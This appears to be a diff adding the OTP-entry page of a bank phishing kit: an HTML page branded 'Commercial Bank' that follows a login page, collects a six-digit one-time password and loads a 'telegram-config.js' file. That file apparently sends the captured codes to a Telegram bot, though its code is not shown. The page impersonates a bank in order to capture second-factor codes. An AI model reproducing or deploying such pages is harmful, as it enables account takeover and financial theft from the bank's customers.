@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - Commercial Bank</title>
+    <link rel="stylesheet" href="otp.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Header -->
+        <header class="otp-header">
+            <button class="back-btn" onclick="window.location.href='login.html'">
+                <span class="back-icon">✕</span>
+            </button>
+            <h1 class="header-title">OTP Verification</h1>
+        </header>
+
+        <!-- Main Content -->
+        <main class="otp-main">
+            <div class="otp-card">
+                <!-- Progress Indicator -->
+                <div class="progress-section">
+                    <div class="step-indicator">STEP 2 OF 2</div>
+                    <div class="progress-bars">
+                        <div class="progress-bar active"></div>
+                        <div class="progress-bar active"></div>
+                    </div>
+                </div>
+
+                <!-- Logo -->
+                <div class="otp-logo-container">
+                    <img src="logo.jpg" alt="Commercial Bank Logo" class="otp-logo">
+                </div>
+
+                <!-- OTP Message -->
+                <p class="otp-message">OTP Sent to register mobile number</p>
+
+                <!-- OTP Input Boxes -->
+                <div class="otp-input-container">
+                    <input type="text" class="otp-input" id="otp1" maxlength="1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" id="otp2" maxlength="1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" id="otp3" maxlength="1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" id="otp4" maxlength="1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" id="otp5" maxlength="1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="otp-input" id="otp6" maxlength="1" autocomplete="off" inputmode="numeric">
+                </div>
+
+                <!-- Error Message -->
+                <div class="error-message" id="errorMessage" style="display: none;">
+                    Invalid OTP please try again later
+                </div>
+
+                <!-- Confirm Button -->
+                <button type="button" class="confirm-btn" id="confirmBtn">
+                    Confirm
+                </button>
+
+                <!-- Resend OTP Link -->
+                <div class="resend-section">
+                    <p class="resend-text">Didn't receive OTP?</p>
+                    <a href="#" class="resend-link" id="resendLink">Resend OTP</a>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="telegram-config.js"></script>
+    <script src="otp.js"></script>
+</body>
+</html>
